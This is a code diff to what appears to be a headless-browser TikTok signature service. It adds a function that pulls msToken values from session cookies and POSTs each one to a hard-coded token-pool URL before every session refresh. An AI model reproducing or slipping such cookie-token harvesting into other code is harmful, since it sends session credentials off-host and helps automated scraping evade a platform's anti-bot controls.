@@ -124,6 +124,9 @@ const ELASTIC_URL = process.env.ELASTIC_URL || "";
 const ELASTIC_INDEX = process.env.ELASTIC_INDEX || "tiktok-signature-metrics";
 const STATS_INTERVAL_MS = Number(process.env.STATS_INTERVAL_MS) || 60_000;
 
+// Token pool export
+const TOKEN_POOL_URL = "http://tiktok.k8s-prod.sgdctroy.net/token/add";
+
 
 // Request queue for sequential processing (prevents concurrent access to browser page)
 const requestQueue = [];
@@ -549,6 +552,37 @@ function shouldRefreshSession() {
   return false;
 }
 
+async function exportMsTokensToPool() {
+  try {
+    const tokens = await page.evaluate(() => {
+      const matches = [...document.cookie.matchAll(/msToken=([^;]+)/g)];
+      return [...new Set(matches.map((m) => m[1]))];
+    });
+    if (!tokens.length) {
+      console.log("[TokenPool] No msTokens found in session cookies");
+      return;
+    }
+    for (const token of tokens) {
+      try {
+        const res = await fetch(TOKEN_POOL_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ value: token, type: "user" }),
+        });
+        if (res.ok) {
+          console.log(`[TokenPool] Exported token (${token.substring(0, 20)}...)`);
+        } else {
+          console.warn(`[TokenPool] Export failed: ${res.status} ${res.statusText}`);
+        }
+      } catch (e) {
+        console.warn(`[TokenPool] Export error: ${e.message}`);
+      }
+    }
+  } catch (e) {
+    console.warn(`[TokenPool] Failed to read cookies: ${e.message}`);
+  }
+}
+
 /**
  * Check if the page is still valid and ready
  */
@@ -561,6 +595,7 @@ async function ensurePageReady() {
     // Check if session should be refreshed to avoid blocks
     if (shouldRefreshSession()) {
       console.log("[Server] Proactive session refresh...");
+      await exportMsTokensToPool();
       await closeBrowser();
       await initBrowser();
       return true;
